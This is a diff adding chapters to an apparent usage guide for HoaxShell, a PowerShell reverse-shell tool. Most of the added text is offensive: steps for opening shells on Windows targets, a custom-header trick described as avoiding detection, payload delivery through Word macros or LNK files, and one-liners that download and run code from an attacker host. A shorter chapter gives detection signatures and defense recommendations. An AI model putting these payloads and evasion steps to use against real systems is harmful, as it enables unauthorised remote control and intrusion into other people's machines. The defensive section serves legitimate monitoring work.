@@ -310,6 +310,156 @@ sudo hoaxshell -s <your_ip> -v
 
 ---
 
+## Chapter 9: Real-World Scenarios
+
+### Quick Shell Establishment
+
+```bash
+# 1. Start HTTPS listener
+sudo hoaxshell -s your.domain.com -t -c cert.pem -k key.pem
+
+# 2. Execute payload on target Windows machine
+# Copy the generated PowerShell payload and run in cmd.exe or PowerShell
+
+# 3. Execute commands in the pseudo-shell
+whoami /all
+systeminfo
+net user
+ipconfig /all
+dir C:\Users
+```
+
+### Custom Header for Evasion
+
+```bash
+# Use Authorization header to avoid detection
+sudo hoaxshell -s <your_ip> -i -H "Authorization"
+
+# The payload will use Invoke-RestMethod with Authorization header
+# This mimics legitimate API calls and avoids random header detection
+```
+
+### File-Based Payload Delivery
+
+```bash
+# Generate raw payload
+sudo hoaxshell -s <your_ip> -r -o /tmp/payload.ps1
+
+# Host payload on HTTP server
+cd /tmp && python3 -m http.server 8080
+
+# Start listener
+sudo hoaxshell -s <your_ip>
+
+# Deliver payload to target (e.g., via Word macro, LNK file, or exploit)
+# On target:
+powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker:8080/payload.ps1')"
+```
+
+### Using with Tunneling
+
+```bash
+# Through ngrok for external access
+# 1. Start ngrok tunnel
+ngrok http 8080
+
+# 2. Start hoaxshell with ngrok URL
+sudo hoaxshell -s <ngrok_subdomain>.ngrok.io -t
+
+# Through localtunnel
+sudo hoaxshell -lt
+```
+
+### Constrained Language Mode Target
+
+```bash
+# When targeting systems with constrained language mode
+sudo hoaxshell -s <your_ip> -cm
+
+# The payload uses alternative PowerShell methods compatible with CLM
+```
+
+### Session Restoration After Crash
+
+```bash
+# If the listener crashes, restore the session
+sudo hoaxshell -s <your_ip> -g
+
+# This reconnects to the existing session without re-executing the payload
+```
+
+---
+
+## Chapter 10: Command Reference
+
+### Command-Line Options
+
+| Option | Description |
+|---|---|
+| `-s <ip>` | Server IP address (required) |
+| `-p <port>` | Server port (default: 8080) |
+| `-c <cert>` | SSL certificate file |
+| `-k <key>` | SSL key file |
+| `-t` | Trusted domain mode |
+| `-i` | Use Invoke-RestMethod |
+| `-x <path>` | File-based execution path |
+| `-r` | Generate raw payload |
+| `-o <file>` | Output payload to file |
+| `-g` | Restore previous session |
+| `-v <version>` | Spoof Server header |
+| `-H <header>` | Custom HTTP header name |
+| `-cm` | Constrained language mode |
+| `-ng` | Use ngrok tunnel |
+| `-lt` | Use localtunnel |
+
+### Payload Variants
+
+| Variant | Description |
+|---|---|
+| Invoke-Expression (default) | Uses IEX to execute commands |
+| File-based (`-x`) | Writes commands to file, executes from there |
+| Raw (`-r`) | Unencoded payload for manual modification |
+
+---
+
+## Chapter 11: Detection and Defense
+
+### Network Signatures
+
+- HTTP(S) requests with PowerShell User-Agent
+- Periodic HTTP(S) beaconing to same endpoint
+- Large HTTP(S) POST requests (command output)
+- Unusual HTTP headers (custom headers from HoaxShell)
+
+### Host-Based Detection
+
+```powershell
+# Monitor for suspicious PowerShell activity
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} |
+  Where-Object {$_.Message -like "*Invoke-WebRequest*" -or $_.Message -like "*Invoke-RestMethod*"}
+
+# Check for HoaxShell process indicators
+Get-Process | Where-Object {$_.ProcessName -eq "powershell" -and $_.CommandLine -like "*DownloadString*"}
+```
+
+### Defense Recommendations
+
+1. Enable PowerShell script block logging
+2. Monitor for Invoke-WebRequest/Invoke-RestMethod from non-browser processes
+3. Implement AMSI and ETW logging
+4. Use application whitelisting for PowerShell execution
+5. Block outbound HTTP(S) from PowerShell by default
+
+### AMSI Detection
+
+```powershell
+# Check AMSI events
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'; ID=1116} |
+  Where-Object {$_.Message -like "*HoaxShell*"}
+```
+
+---
+
 ## Resources
 
 - **GitHub Repository:** https://github.com/t3l3machus/hoaxshell
@@ -317,4 +467,35 @@ sudo hoaxshell -s <your_ip> -v
 - **RevShells.com:** https://revshells.com (web-based payload generation)
 - **MITRE ATT&CK - Command and Control:** https://attack.mitre.org/tactics/TA0011/
 - **MITRE ATT&CK - Application Layer Protocol:** https://attack.mitre.org/techniques/T1071/
+- **MITRE ATT&CK - Ingress Tool Transfer:** https://attack.mitre.org/techniques/T1105/
 - **Related Tools:** Villain, Netcat, Socat, Metasploit Framework
+
+---
+
+## Appendix: Quick Reference Card
+
+### One-Liner Payloads
+
+```powershell
+# Default HTTP payload
+powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://IP:PORT/'); Invoke-HoaxShell -Verbose"
+
+# HTTPS payload
+powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://DOMAIN/'); Invoke-HoaxShell -Verbose"
+
+# File-based payload
+powershell -ep bypass -c "Add-Content -Path 'C:\temp\shell.ps1' -Value (New-Object Net.WebClient).DownloadString('http://IP:PORT/'); & 'C:\temp\shell.ps1'"
+```
+
+### Common Commands in Pseudo-Shell
+
+| Command | Description |
+|---|---|
+| `whoami /all` | Current user context |
+| `systeminfo` | System information |
+| `net user` | List users |
+| `net localgroup administrators` | List admins |
+| `ipconfig /all` | Network configuration |
+| `dir C:\Users` | List user directories |
+| `tasklist` | Running processes |
+| `netstat -ano` | Active connections |
